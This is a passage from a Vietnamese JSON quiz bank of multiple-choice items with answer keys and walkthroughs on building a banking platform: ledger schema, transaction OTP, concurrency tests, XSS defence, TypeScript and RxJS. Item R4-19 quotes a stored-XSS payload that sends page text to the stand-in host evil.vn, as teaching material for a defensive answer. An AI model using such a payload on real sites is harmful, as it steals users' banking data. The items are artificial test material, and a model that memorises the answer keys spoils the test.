          "Thiết kế lược đồ chuẩn hóa gồm: `accounts` (`NUMERIC(19, 4)` hoặc `BIGINT` cho tiền tệ, `version BIGINT`, `CHECK (ledger_balance >= 0 OR allow_overdraft = true)`), `journals` + `ledger_postings` (`direction VARCHAR CHECK (direction IN ('DEBIT','CREDIT'))`, `amount NUMERIC(19, 4) NOT NULL CHECK (amount > 0)`, Index kết hợp `(account_id, created_at DESC)`), `idempotency_records` (`UNIQUE (client_id, idempotency_key)`), và `outbox_events` nằm chung lược đồ giao dịch ACID."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "Milestone 1 ... V1__init_core_ledger.sql trên PostgreSQL 16 ... nền móng vững chắc chuẩn Production",
          "whyCorrect": "Khi Sếp Kỹ thuật mở GitHub đồ án cá nhân của ứng viên ra xem, nơi đầu tiên họ click vào luôn là thư mục `db/migration`! Nhìn thấy một file Flyway sạch đẹp dùng kiểu số thập phân chính xác **`NUMERIC(19, 4)`** (tuyệt đối không có bóng dáng `FLOAT`/`DOUBLE`), có chốt chặn cuối cùng ở tầng Database **`CHECK (amount > 0)`**, tách bạch `journals` (chứng từ) và `ledger_postings` (bút toán Nợ/Có), có bảng **`idempotency_records` với khóa `UNIQUE (client_id, idempotency_key)`** và bảng **`outbox_events`** sẵn sàng cho kiến trúc hướng sự kiện là hội đồng biết ngay ứng viên có tư duy thiết kế dữ liệu cực kỳ bài bản và cẩn trọng!",
          "whyWrong": [
            "Dùng kiểu `FLOAT` cho tiền tệ và phó mặc toàn vẹn dữ liệu cho giao diện Frontend là lỗi sơ đẳng khiến đồ án bị loại ngay từ vòng lọc CV kỹ thuật.",
            "Nhồi hàng triệu giao dịch vào một cột chuỗi phân cách dấu chấm phẩy vi phạm Chuẩn dạng 1 (1NF), không thể đánh Index, không thể khóa dòng và làm sập DB ngay khi dữ liệu lớn dần.",
            "`ddl-auto=create-drop` (hay thậm chí `update`) bị cấm tuyệt đối trên Production ngân hàng; mọi thay đổi schema phải đi qua công cụ quản trị phiên bản như Flyway/Liquibase (`ddl-auto=validate`).",
            ""
          ],
          "tip": "Muốn GitHub Capstone ghi điểm ngay 30 giây đầu tiên -> Đầu tư thật kỹ file `V1__init_core_ledger.sql`: dùng `NUMERIC(19,4)`, `CHECK (amount > 0)`, `UNIQUE (client_id, idempotency_key)`, `outbox_events` và đặt `ddl-auto=validate`!"
        }
      },
      {
        "id": "R4-14",
        "domain": "Capstone M2: Xác thực 2 Lớp JWT Phiên + Smart OTP Giao dịch (C2)",
        "lessonId": "C2",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở Milestone 2 xây dựng Identity Service và API Gateway cho đồ án ngân hàng số, làm thế nào bạn tách biệt rạch ròi giữa 'Xác thực phiên đăng nhập' và 'Xác thực ủy quyền từng lệnh chuyển tiền cụ thể' để đạt chuẩn an ninh tài chính?",
        "options": [
          "Thiết kế cơ chế **Xác thực 2 lớp độc lập**: Lớp 1 tại API Gateway & Resource Server kiểm chứng **Session JWT (RS256)** để định danh người dùng (`cif`) và giới hạn tốc độ truy cập (`RateLimiter` theo `cif`); Lớp 2 tại Core Transfer Service bắt buộc kiểm chứng thêm Header **`X-Transaction-OTP` (mã Smart OTP dùng 1 lần duy nhất gắn chặt với `txnIntentId + toAccountNo + amount` và đánh dấu tiêu hủy nguyên tử trên Redis ngay khi khớp)** đối với các giao dịch chuyển tiền ra ngoài.",
          "Chỉ dùng duy nhất 1 Access Token JWT lúc đăng nhập đầu ngày; hễ có Access Token đó trong Header là cho phép gọi API chuyển khoản rút sạch 5 tỷ đồng không cần xác nhận gì thêm.",
          "Bắt người dùng gõ lại tên đăng nhập, mật khẩu và chụp lại ảnh CCCD hai mặt ở mọi thao tác xem lịch sử giao dịch.",
          "Dùng chung một mã PIN cố định `'000000'` mặc định cho toàn bộ người dùng trong hệ thống và không cho phép đổi."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "Milestone 2 ... tách biệt rạch ròi giữa 'Xác thực phiên đăng nhập' và 'Xác thực ủy quyền từng lệnh chuyển tiền cụ thể'",
          "whyCorrect": "Thiết kế 2 lớp xác thực (**Session Authentication vs Step-up Transaction Authorization**) chính là dấu ấn phân biệt một ứng dụng ngân hàng thật sự với một bài tập CRUD sinh viên thông thường! Access Token JWT chỉ trả lời câu hỏi *'Ai đang mở ứng dụng xem số dư?'*; nhưng khi bước sang hành động dịch chuyển tiền ra khỏi tài khoản (`POST /api/v1/transfers`), hệ thống bắt buộc yêu cầu bằng chứng ủy quyền mức giao dịch **`X-Transaction-OTP`** ký trên chính bộ tham số `(txnIntentId, toAccountNo, amount)` và tiêu hủy ngay sau 1 lần sử dụng (`SETNX` / xóa challenge nguyên tử) để không thể dùng lại cho bất kỳ lệnh thứ hai nào!",
          "whyWrong": [
            "",
            "Chỉ dựa vào mỗi Session Token để cho phép rút hàng tỷ đồng vi phạm quy định xác thực mạnh (SCA / Quyết định 2345) đối với giao dịch thanh toán trực tuyến.",
            "Bắt chụp lại CCCD chỉ để xem lịch sử giao dịch là thiết kế cực đoan vô lý phá hỏng hoàn toàn trải nghiệm khách hàng ở các tác vụ đọc thông thường.",
            "Hardcode PIN mặc định giống nhau cho mọi tài khoản có nghĩa là bất kỳ ai cũng ký duyệt được giao dịch của người khác."
          ],
          "tip": "Kiến trúc bảo mật chuẩn cho Đồ án Ngân hàng: **Lớp 1 (`Authorization: Bearer <RS256 JWT>`)** định danh phiên + Rate Limit theo `CIF`; **Lớp 2 (`X-Transaction-OTP`)** xác nhận dùng 1 lần gắn chặt `toAccount + amount`!"
        }
      },
      {
        "id": "R4-15",
        "domain": "Capstone M3: Kiểm thử Đa luồng Bảo toàn Tổng Tiền (C3)",
        "lessonId": "C3",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở Milestone 3 hoàn thiện Core Ledger nội bộ, bạn muốn viết một bài kiểm thử tự động trong dự án để chứng minh một cách toán học không thể chối cãi trước hội đồng tuyển dụng rằng code chuyển tiền của bạn **không bị Race Condition âm tiền, không bị Deadlock khi chuyển chéo và không thất thoát dù 1 đồng lẻ**. Bài test nào thuyết phục nhất?",
        "options": [
          "Viết 1 bài Unit Test dùng `Mockito.when(...)` giả lập toàn bộ Repository trả về thành công trên 1 luồng duy nhất.",
          "Viết **Concurrency Invariant Integration Test** chạy trên container **PostgreSQL 16 thật (Testcontainers)**: khởi tạo 20 tài khoản mỗi tài khoản 10.000.000 VNĐ (tổng hệ thống = 200.000.000 VNĐ), dùng `ExecutorService` + `CountDownLatch` kích nổ đồng thời **50 luồng bắn ngẫu nhiên 1.000 lệnh chuyển tiền chéo hai chiều** (kèm cả các cặp cố tình bắn trùng `Idempotency-Key` và chuyển vượt số dư), sau khi hoàn tất khẳng định 3 bất biến: (1) Không có lỗi Deadlock nào xảy ra, (2) Không có bất kỳ tài khoản nào có số dư `< 0`, và (3) **Tổng số dư của cả 20 tài khoản vẫn bằng đúng `200.000.000 VNĐ` (và `SUM(debit) == SUM(credit)` trên sổ cái)**!",
          "Dùng cơ sở dữ liệu giả lập H2 chạy tuần tự vòng lặp `for` từ 1 đến 5 trên một tài khoản duy nhất có sẵn 100 tỷ đồng.",
          "Chụp ảnh màn hình Postman bấm tay 1 lần thành công đính kèm vào file Word."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "Milestone 3 ... chứng minh toán học không bị Race Condition âm tiền, không Deadlock khi chuyển chéo và không thất thoát dù 1 đồng",
          "whyCorrect": "Anh nói thật với em: trong hàng trăm CV gửi về ứng tuyển Senior Java Ngân hàng, cứ ứng viên nào có đúng class `TransferConcurrencyInvariantIT` dùng **Testcontainers PostgreSQL + `CountDownLatch` bắn 50 luồng chuyển chéo ngẫu nhiên kiểm chứng Định luật Bảo toàn Tiền tệ (`Initial Total == Final Total` & `No Negative Balance` & `Zero Deadlocks`)** xanh mượt trong CI pipeline là cả hội đồng chấm điểm tối đa phần kỹ thuật ngay lập tức! Bởi nếu code thiếu khóa dòng -> sẽ có tài khoản bị âm hoặc tổng tiền lệch ngay sau vài chục vòng; nếu khóa không sắp xếp theo thứ tự `accountId` tăng dần -> 50 luồng chuyển chéo A<->B sẽ nổ `PSQLException: deadlock detected` ngay ở giây thứ 2; nếu thiếu Idempotency -> các lệnh bắn đúp sẽ làm sai kết quả! Một bài test ngắn 60 dòng kiểm chứng trọn vẹn toàn bộ bản lĩnh Concurrency!",
          "whyWrong": [
            "Mock hết Repository trên 1 luồng hoàn toàn không chạm tới cơ chế khóa MVCC/Row Lock thật của Database nên code có dính 10 lỗi Race Condition bài test vẫn báo xanh.",
            "",
            "Chạy tuần tự 1 luồng trên tài khoản dư dả 100 tỷ không bao giờ tái hiện được tranh chấp đồng thời hay kịch bản cạn số dư.",
            "Bấm tay 1 lần trên Postman chỉ kiểm tra được luồng Happy Path đơn giản nhất, không có giá trị chứng minh tính chịu tải đồng thời."
          ],
          "tip": "Vũ khí 'sát thủ' trong GitHub Capstone Ngân hàng: Viết bài test **`TransferConcurrencyInvariantIT`** (Testcontainers Postgres + `CountDownLatch` 50 threads chuyển chéo 1.000 lệnh) assert `noDeadlock && minBalance >= 0 && sumAfter == sumBefore`!"
        }
      },
      {
        "id": "R4-16",
        "domain": "Capstone M4: Giả lập Lỗi NAPAS, Saga & Đối soát T+0 (C4)",
        "lessonId": "C4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Khi demo Milestone 4 (Payment Hub Liên Ngân hàng + Saga + Đối soát) trực tiếp trước Hội đồng Phỏng vấn, hầu hết các dự án cá nhân chỉ demo được luồng thành công suôn sẻ nên khá nhạt nhòa. Bạn thiết kế tính năng gì trong `napas-mock-service` và trang Back-Office để màn demo khiến hội đồng ấn tượng mạnh nhất?",
        "options": [
          "Hardcode `napas-mock-service` luôn luôn trả về HTTP 200 thành công sau 1 mili-giây trong mọi trường hợp.",
          "Khi `napas-mock-service` trả lỗi thì cho sập luôn tiến trình Payment Hub để chứng minh hệ thống biết dừng hoạt động khi gặp khó khăn.",
          "Tích hợp chế độ **Chaos / Fault-Injection cấu hình nóng** trên `napas-mock-service` (cho phép bật cờ giả lập `TIMEOUT_68`, `INSUFFICIENT_FUNDS`, `DELAY_5S` hoặc tỷ lệ lỗi 20% ngay trên UI vận hành): trực tiếp demo cảnh bật cờ Timeout -> khách chuyển tiền thấy trạng thái `PENDING`, tiền được khoanh an toàn ở tài khoản `Suspense GL` không trừ đúp khi khách bấm thử lại -> sau đó bấm chạy **Spring Batch Job Đối soát T+0** đọc file quyết toán từ Mock NAPAS tự động phát hiện lệch và sinh bút toán giải tỏa cập nhật giao dịch về trạng thái cuối cùng chuẩn xác!",
          "Xóa hết giao dịch bị Timeout khỏi Database trước buổi phỏng vấn để màn hình quản trị chỉ toàn màu xanh."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "demo Milestone 4 trực tiếp trước Hội đồng Phỏng vấn ... làm sao gây ấn tượng mạnh nhất thay vì chỉ demo luồng thành công",
          "whyCorrect": "Đây chính là 'chiêu bài đinh' tạo ra khoảng cách 200% giữa một Senior thực chiến với phần còn lại! Trong ngân hàng, xử lý lúc mạng êm ả chỉ chiếm 20% độ khó; **80% giá trị tiền lương của Senior nằm ở cách hệ thống ứng xử khi đối tác Timeout, mạng đứt và số liệu lệch**! Khi ngồi trước hội đồng, em mở song song 2 tab: bật công tắc *'Simulate NAPAS ReadTimeout'* -> thực hiện chuyển khoản -> chỉ trực tiếp vào bảng Sổ cái chứng minh tiền đang nằm gọn ở `Suspense GL` -> bấm chạy nút *'Trigger Reconciliation Batch'* -> 3 giây sau hệ thống tự khớp file quyết toán, đảo bút toán chuẩn xác và bắn SSE báo khách hàng! Không một người phỏng vấn ngân hàng nào cưỡng lại được màn demo thực chiến sống động như Production thật ấy!",
          "whyWrong": [
            "Mock luôn luôn thành công tức thời biến cổng liên ngân hàng thành một lời gọi hàm vô tri, không kiểm chứng được bất kỳ nhánh Saga bù trừ hay đối soát nào.",
            "Để lỗi của đối tác bên ngoài làm sập tiến trình nội bộ là thiết kế thiếu khả năng chịu lỗi (Zero Resilience).",
            "",
            "Giấu nhẹm kịch bản lỗi làm mất đi cơ hội vàng để trình diễn tư duy xử lý giao dịch nghi vấn (Doubtful Transaction) vốn là đặc sản ngành thanh toán."
          ],
          "tip": "Khi làm Capstone Payment Hub: Đừng chỉ viết Mock luôn trả `200 OK`! Hãy làm công tắc **Fault-Injection (`FORCE_TIMEOUT`, `RANDOM_DELAY`)** để demo trực tiếp trọn vòng đời `Timeout -> Suspense GL -> Batch Reconciliation -> Auto-Settle/Refund`!"
        }
      },
      {
        "id": "R4-17",
        "domain": "Capstone M5: Đồng bộ SSE & TanStack Query Cache (C5)",
        "lessonId": "C5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở Milestone 5 trên giao diện React + TypeScript của `finbank-platform`, người dùng đang mở màn hình Dashboard hiển thị số dư hiện tại (`useQuery({ queryKey: ['accounts'] })`) và bảng 10 giao dịch gần nhất (`useQuery({ queryKey: ['statements', accountNo] })`). Khi một người bạn quét mã VietQR chuyển đến 500.000 VNĐ và luồng `EventSource` (SSE) nhận được sự kiện `BALANCE_UPDATED`, cách cập nhật giao diện nào vừa mượt mà vừa đảm bảo tính nhất quán dữ liệu với Server?",
        "options": [
          "Hiển thị Toast thông báo 'Nhận +500.000 VNĐ' kèm mã giao dịch chống hiển thị trùng, đồng thời gọi **`queryClient.invalidateQueries({ queryKey: ['accounts'] })`** và **`queryClient.invalidateQueries({ queryKey: ['statements', event.accountNo] })`** để TanStack Query tự động lấy lại số dư và dòng sao kê chuẩn xác từ Server dưới nền mà không cần tải lại toàn bộ trang.",
          "Chỉ lấy số dư đang hiển thị trên thẻ HTML cộng tay thêm `500000` bằng `document.getElementById('balance').innerText = ...` và không bao giờ đồng bộ lại với Server.",
          "Gọi `window.close()` đóng tab trình duyệt của người dùng rồi bắt họ tự mở lại trình duyệt đăng nhập lại để thấy số tiền mới.",
          "Khởi tạo mới thêm một kết nối `new EventSource(...)` ở mỗi lần component re-render mà không đóng kết nối cũ trong hàm cleanup của `useEffect`."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "SSE nhận sự kiện BALANCE_UPDATED ... cập nhật giao diện vừa mượt mà vừa đảm bảo tính nhất quán dữ liệu với Server",
          "whyCorrect": "Sự kết hợp ăn ý hoàn hảo giữa **Push (SSE)** và **Pull/Server-State Cache (TanStack Query)**! Thay vì phải polling mù quáng mỗi giây, kết nối `EventSource` nằm yên lắng nghe tốn gần như 0 băng thông; ngay khoảnh khắc có sự kiện `BALANCE_UPDATED` bắn xuống, ứng dụng vừa bật Toast thông báo tức thời cho người dùng, vừa gọi **`queryClient.invalidateQueries`** đánh dấu dữ liệu tài khoản và sao kê đã cũ để TanStack Query tự fetch lại bản ghi chính thống từ Sổ cái (đảm bảo nếu có 2–3 giao dịch đến sát nhau hoặc có khấu trừ phí thì con số hiển thị trên UI vẫn khớp 100% với nguồn chân lý duy nhất trên Backend!). Và nhớ luôn đóng `eventSource.close()` trong hàm cleanup của `useEffect` nhé!",
          "whyWrong": [
            "",
            "Can thiệp trực tiếp DOM cộng tay bỏ qua trạng thái của React và nguồn dữ liệu gốc phía Server sẽ làm lệch số dư ngay khi gói tin SSE bị đến trễ, đến lặp hoặc khi React re-render đè lại giá trị cũ.",
            "Đóng tab bắt khách đăng nhập lại là hành vi phá hoại trải nghiệm người dùng.",
            "Tạo mới `EventSource` ở mỗi lần render mà không `close()` trong cleanup của `useEffect` sẽ gây rò rỉ hàng chục kết nối mạng và làm một giao dịch bị bật thông báo lặp 10–20 lần!"
          ],
          "tip": "Mẫu thiết kế chuẩn Real-time Banking UI: Dùng **`useEffect` quản lý đúng 1 `EventSource` (có `close()` khi unmount)** -> Nhận sự kiện `BALANCE_UPDATED` -> Bật Toast (có dedup `eventId`) + gọi **`queryClient.invalidateQueries`**!"
        }
      },
      {
        "id": "R4-18",
        "domain": "Capstone M6: Docker Compose, Load Test k6 & Tài liệu ADR (C6)",
        "lessonId": "C6",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở Milestone 6 hoàn thiện hồ sơ ứng tuyển Senior với đồ án `finbank-platform`, làm thế nào để trình bày kho mã nguồn GitHub sao cho Giám đốc Kỹ thuật / Tech Lead chỉ mất 3 phút đọc qua đã đánh giá bạn ở đẳng cấp Senior vượt trội?",
        "options": [
          "Để trống hoàn toàn file `README.md` (chỉ có dòng chữ mặc định 'Getting Started with Spring Boot') để kích thích sự tò mò bắt người tuyển dụng phải tự đọc mò 150 file Java.",
          "Viết mô tả dự án phóng đại rằng hệ thống chạy trên máy tính cá nhân đạt 100 triệu giao dịch mỗi giây mà không có bất kỳ kịch bản kiểm thử hay số liệu đo đạc nào.",
          "Commit toàn bộ thư mục `target/`, `node_modules/` nặng 1,8 GB cùng file `.env` chứa mật khẩu thật lên nhánh `main`.",
          "Đóng gói trọn bộ hạ tầng & dịch vụ chạy lên mượt mà chỉ với 1 lệnh `docker compose up -d` (có cấu hình `healthcheck` chờ DB/Kafka sẵn sàng), đính kèm kịch bản & ảnh chụp biểu đồ **Load Test `k6` + Grafana Dashboard** chứng minh đạt hàng trăm/nghìn TPS với P99 thấp và tổng tiền bảo toàn 100%, đồng thời viết `README.md` có Sơ đồ Kiến trúc (Mermaid) kèm mục **ADR (Architecture Decision Records)** giải thích sắc bén *tại sao* chọn từng giải pháp và đánh đổi gì."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "Milestone 6 ... trình bày kho mã nguồn GitHub sao cho Tech Lead chỉ mất 3 phút đọc qua đã đánh giá đẳng cấp Senior",
          "whyCorrect": "Anh ngồi ghế phỏng vấn tuyển hàng chục Senior Java mỗi năm nên chia sẻ thật lòng bí mật này với em: Tech Lead cực kỳ bận, họ có đúng **3 đến 5 phút** để lướt một GitHub repo trước giờ phỏng vấn! Nếu mở ra thấy: (1) Sơ đồ kiến trúc rõ ràng từ BFF -> Gateway -> Core Ledger -> Kafka Outbox -> Payment Hub; (2) Bảng **ADR (Architecture Decision Records)** giải thích gãy gọn *'Tại sao chọn Pessimistic Lock có sắp thứ tự ID thay vì Optimistic Lock cho tài khoản nóng?', 'Tại sao tách HTTP gọi NAPAS ra ngoài `@Transactional`?'*; (3) Kịch bản `k6` kèm ảnh chụp Grafana đo rõ `850 TPS, P99 = 42ms, Error = 0%, Ledger Invariant = Verified`; và (4) `docker compose up -d` chạy lên ngon lành ngay lần đầu -> buổi phỏng vấn hôm đó gần như biến thành buổi trò chuyện đồng nghiệp và chốt mức lương Offer cao nhất khung!",
          "whyWrong": [
            "Repo không có `README` kiến trúc khiến 90% người chấm không đủ thời gian dò code và đánh giá ứng viên thiếu kỹ năng giao tiếp tài liệu kỹ thuật của một Senior.",
            "Nổ con số phi vật lý không có kịch bản đo kiểm (`k6`/`JMeter`) chứng minh sẽ bị hội đồng hỏi vặn 2 câu về Disk IOPS và Lock Contention là lộ ngay lập tức.",
            "Đẩy `target/` và `node_modules/` cùng file `.env` lên Git là lỗi vệ sinh kho mã nguồn cơ bản khiến điểm chuyên nghiệp tụt dốc thảm hại.",
            ""
          ],
          "tip": "Bộ tứ hoàn hảo cho `README.md` Đồ án Senior: **Sơ đồ Kiến trúc luồng tiền** + **3–5 bản ADR nêu rõ Trade-offs** + **Báo cáo Load Test `k6` & Invariant Test** + **1 lệnh `docker compose up -d` chạy ngay**!"
        }
      },
      {
        "id": "R4-19",
        "domain": "Phòng chống XSS & Content-Security-Policy trên Web Banking (F1)",
        "lessonId": "F1",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Kẻ tấn công chuyển 1.000 VNĐ vào tài khoản của nạn nhân với nội dung chuyển khoản là: `Chuc mung <img src=x onerror=\"fetch('https://evil.vn/steal?d='+document.body.innerText)\">`. Trên màn hình Lịch sử giao dịch của ứng dụng Web Ngân hàng, một lập trình viên dùng `dangerouslySetInnerHTML` (hoặc `[innerHTML]` không lọc) để tô đậm từ khóa tìm kiếm khiến đoạn mã độc thực thi ngay khi nạn nhân mở sao kê! Bạn phải phòng thủ nhiều lớp như thế nào?",
        "options": [
          "Cấm khách hàng trên toàn quốc nhập chữ cái tiếng Anh vào ô nội dung chuyển khoản.",
          "Phòng thủ đa lớp (Defense-in-Depth): (1) Ở Backend kiểm tra định dạng đầu vào chuẩn ký tự cho phép của chuyển mạch thanh toán; (2) Ở Frontend tuyệt đối **KHÔNG dùng `dangerouslySetInnerHTML`** với dữ liệu người dùng nhập (tách mảng chuỗi React Component để tô đậm từ khóa an toàn nhờ cơ chế Auto-escaping của JSX); và (3) Cấu hình HTTP Header **`Content-Security-Policy (CSP)` chặt chẽ** (`default-src 'self'; script-src 'self' 'nonce-<random>'; connect-src 'self' https://bff.omnibank.vn; object-src 'none'`) để trình duyệt chặn đứng cả việc chạy inline script lẫn việc gọi `fetch` tuồn dữ liệu ra tên miền lạ `evil.vn`!",
          "Chỉ kiểm tra chặn từ khóa `<script>` bằng hàm `replace(\"<script>\", \"\")` trên Frontend là an toàn tuyệt đối.",
          "Chuyển màu chữ của cột nội dung chuyển khoản sang màu xám nhạt để thẻ `<img>` không chạy sự kiện `onerror` được."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "nội dung chuyển khoản chứa <img src=x onerror=...> ... dùng dangerouslySetInnerHTML tô đậm từ khóa làm mã độc thực thi",
          "whyCorrect": "Kịch bản **Stored XSS qua Nội dung chuyển khoản** là bài kiểm tra kinh điển của đội Red Team ngân hàng! Điều đáng sợ là nội dung chuyển khoản đến từ ngân hàng khác qua cổng liên ngân hàng, tức là do người lạ hoàn toàn kiểm soát! Phòng thủ chuẩn Senior không bao giờ đặt cược mạng sống vào một lớp duy nhất: (1) Loại bỏ ngay `dangerouslySetInnerHTML` (muốn highlight từ khóa tìm kiếm, chỉ cần cắt chuỗi thành các thẻ `<mark>{part}</mark>` thuần JSX để React tự escape `<>\"'&` 100%); (2) Thiết lập lá chắn thép **`Content-Security-Policy (CSP)`**: không có `'unsafe-inline'` thì thuộc tính `onerror=...` chết ngay từ trong trứng nước, và thêm `connect-src 'self' https://bff.omnibank.vn` thì dù hacker có tìm được cách chạy JS đi nữa cũng không thể gửi dữ liệu sao kê ra `https://evil.vn`!",
          "whyWrong": [
            "Nội dung chuyển khoản hợp pháp luôn cần chữ cái và chữ số (mã hóa đơn, tên người nộp, nội dung hợp đồng).",
            "",
            "Lọc đen thủ công `replace(\"<script>\", \"\")` cực kỳ ngây thơ: chính payload trong đề bài dùng thẻ `<img src=x onerror=...>` không hề có chữ `script` nào, hoặc hacker viết `<scr<script>ipt>` là vượt qua ngay!",
            "Thuộc tính màu sắc CSS hoàn toàn không ngăn cản trình duyệt tải thẻ `<img>` lỗi và kích hoạt trình xử lý sự kiện JavaScript `onerror`."
          ],
          "tip": "Chống Stored XSS trên màn hình Sao kê Ngân hàng: **Cấm `dangerouslySetInnerHTML` trên nội dung giao dịch** + **Triển khai `Content-Security-Policy` cấm `unsafe-inline` và khóa chặt `connect-src`**!"
        }
      },
      {
        "id": "R4-20",
        "domain": "TypeScript Discriminated Unions cho Trạng thái Giao dịch (F2)",
        "lessonId": "F2",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Một màn hình Chuyển khoản viết bằng TypeScript quản lý trạng thái bằng 5 biến rời rạc: `isLoading: boolean`, `isPendingPartner: boolean`, `isSuccess: boolean`, `errorMessage: string | null`, `receipt: Receipt | null`. Khi mạng chập chờn rồi thành công sau lần polling thứ hai, một lỗi quên reset biến làm màn hình hiển thị **cùng một lúc cả vòng xoay đang tải, cả thông báo thành công màu xanh LẪN hộp cảnh báo lỗi màu đỏ**! Mẫu thiết kế TypeScript nào loại bỏ hoàn toàn các 'trạng thái vô lý (Impossible States)' này ngay từ lúc biên dịch?",
        "options": [
          "Thêm biến boolean thứ 6 là `isReallySuccessAndNotError: boolean` và viết chuỗi 16 nhánh `if-else` lồng nhau trong JSX.",
          "Đổi toàn bộ kiểu dữ liệu sang `any` để TypeScript không báo cảnh báo gạch đỏ nữa.",
          "Mô hình hóa bằng **Discriminated Union (Tagged Union / State Machine)** với trường phân biệt `status`: `type TransferViewState = | { status: 'IDLE' } | { status: 'SUBMITTING'; idemKey: string } | { status: 'PENDING_PARTNER'; txnRef: string } | { status: 'SUCCEEDED'; receipt: Receipt } | { status: 'FAILED'; code: string; message: string }` kèm kiểm tra vét cạn (`exhaustive switch / never`) khi render giao diện.",
          "Xóa hết thông báo lỗi đi và chỉ hiển thị duy nhất một màn hình trắng cho mọi trạng thái."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "5 biến boolean rời rạc ... hiển thị cùng một lúc cả vòng xoay đang tải, cả thông báo thành công LẪN hộp cảnh báo lỗi ... loại bỏ Impossible States lúc biên dịch",
          "whyCorrect": "Triết lý thiết kế kiểu dữ liệu cực hay trong kỹ nghệ phần mềm hiện đại: ***'Make Impossible States Unrepresentable'***! Hãy làm phép đếm tổ hợp: 5 biến độc lập tạo ra tối thiểu $2^5 = 32$ trạng thái tổ hợp khác nhau, trong khi nghiệp vụ chuyển tiền thực tế chỉ có đúng **5 trạng thái hợp lệ loại trừ lẫn nhau**! Dùng **Discriminated Union** với khóa phân biệt `status`: ở nhánh `status === 'SUCCEEDED'`, trình biên dịch TypeScript bắt buộc phải truyền `receipt` và đảm bảo không hề tồn tại thuộc tính `errorMessage`; ở nhánh `status === 'FAILED'`, không thể tồn tại `receipt`! Kết hợp kiểm tra vét cạn kiểu `never` giúp nếu sau này Backend thêm trạng thái mới như `'STEP_UP_FACE_AUTH_REQUIRED'`, trình biên dịch báo nhắc ngay tất cả các màn hình cần cập nhật!",
          "whyWrong": [
            "Càng đẻ thêm cờ boolean rời rạc thì số tổ hợp trạng thái mâu thuẫn càng tăng theo hàm mũ ($2^6 = 64$ tổ hợp), biến component thành mớ bòng bong không ai dám sửa.",
            "Dùng `any` là tự bịt mắt tắt toàn bộ hệ thống kiểm tra kiểu an toàn của TypeScript, làm lỗi chỉ phát nổ khi khách hàng thật bấm trên Production.",
            "",
            "Màn hình trắng không hiển thị trạng thái khiến khách hàng không biết tiền đã trừ hay chưa và gọi cháy máy tổng đài."
          ],
          "tip": "Quản lý trạng thái màn hình giao dịch tài chính trên TypeScript -> Dẹp ngay 4–5 cờ `boolean` rời rạc; dùng **Discriminated Union (`status: 'IDLE' | 'SUBMITTING' | 'PENDING_PARTNER' | 'SUCCEEDED' | 'FAILED'`)**!"
        }
      },
      {
        "id": "R4-21",
        "domain": "Phân biệt Toán tử RxJS trên Hệ thống Ngân hàng (F4)",
        "lessonId": "F4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Trong ứng dụng Angular của Ngân hàng, bạn có 2 luồng tương tác khác nhau trên cùng một biểu mẫu Chuyển tiền: (Luồng A) Ô nhập tìm kiếm tên/mã chi nhánh ngân hàng thụ hưởng gửi truy vấn gợi ý khi người dùng gõ phím; (Luồng B) Nút bấm 'Hạch toán chuyển tiền' gửi lệnh `POST` trích nợ tài khoản. Bạn chọn cặp toán tử RxJS Flattening nào cho Luồng A và Luồng B là chuẩn xác nhất?",
        "options": [
          "Luồng A dùng `exhaustMap`, Luồng B dùng `switchMap`.",
          "Luồng A không gọi API nào cả, còn Luồng B dùng vòng lặp `while(true)` bắn liên tục cho tới khi hết RAM trình duyệt.",
          "Cả Luồng A và Luồng B đều dùng `mergeMap` để tất cả các cú gõ phím lẫn các cú bấm đúp đều chạy đua song song ai về đích sau thì hiển thị.",
          "Luồng A dùng **`switchMap`** (đi kèm `debounceTime` và `distinctUntilChanged` để hủy ngay kết quả tìm kiếm cũ lỗi thời khi người dùng gõ thêm ký tự mới); Luồng B dùng **`exhaustMap`** (khóa bỏ qua mọi cú click lặp trong suốt thời gian lệnh `POST` hạch toán hiện tại đang chờ phản hồi từ Server)."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "Luồng A: Ô nhập tìm kiếm gợi ý khi gõ phím ... Luồng B: Nút bấm Hạch toán chuyển tiền gửi lệnh POST",
          "whyCorrect": "Sự đối lập rõ nét nhất giúp em không bao giờ nhầm các toán tử bậc cao (Higher-Order Mapping Operators) của RxJS nữa! Với **Luồng A (Đọc/Tìm kiếm gợi ý)**: khi khách gõ `'Viet'` rồi gõ tiếp thành `'Vietcom'`, kết quả của `'Viet'` trở nên vô giá trị (thậm chí nếu mạng làm gói trả lời của `'Viet'` về sau gói `'Vietcom'` mà dùng `mergeMap` sẽ gây lỗi ghi đè hiển thị sai kết quả cũ!) -> **`switchMap`** hủy ngay request đọc cũ để chỉ lấy request mới nhất. Ngược lại hoàn toàn, với **Luồng B (Ghi/Hạch toán tiền tệ)**: cú click ĐẦU TIÊN mới là ý định thật đang được xử lý trên Server, những cú click thứ 2, thứ 3 do sốt ruột phải bị chặn đứng ngay từ cửa -> **`exhaustMap`** bảo vệ luồng đầu tiên chạy đến cùng và phớt lờ mọi cú spam click!",
          "whyWrong": [
            "Ngược hoàn toàn: dùng `exhaustMap` cho ô tìm kiếm sẽ làm chữ khách gõ thêm sau đó bị bơ đi không tìm tiếp, còn dùng `switchMap` cho nút chuyển tiền sẽ bắn nhiều lệnh `POST` trùng lên Server!",
            "Vòng lặp vô tận làm treo cứng luồng chính của trình duyệt ngay tức khắc.",
            "Dùng `mergeMap` cho ô tìm kiếm gây lỗi Race Condition kết quả cũ đè kết quả mới; dùng `mergeMap` cho nút chuyển tiền gây bắn đúp giao dịch.",
            ""
          ],
